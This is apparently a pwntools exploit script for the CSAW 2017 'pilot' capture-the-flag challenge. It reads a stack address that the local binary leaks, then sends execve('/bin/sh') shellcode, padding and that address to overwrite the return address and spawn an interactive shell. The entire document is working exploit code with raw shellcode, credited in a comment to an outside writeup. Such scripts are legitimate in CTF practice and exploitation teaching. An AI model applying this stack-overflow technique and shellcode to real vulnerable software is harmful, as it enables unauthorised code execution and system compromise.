from pwn import *

target = process("./pilot")
gdb.attach(target, gdbscript = 'b read')

target.recvuntil("[*]Location:")

leak = target.recvline()

inputAdr = int(leak.strip(b"\n"), 16)

#no pie
stack_addr = p64(inputAdr)

# stoled from writeup https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/
shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

padding = b"0" * (0x28 - len(shellcode))


target.sendline(shellcode + padding + stack_addr)

target.interactive()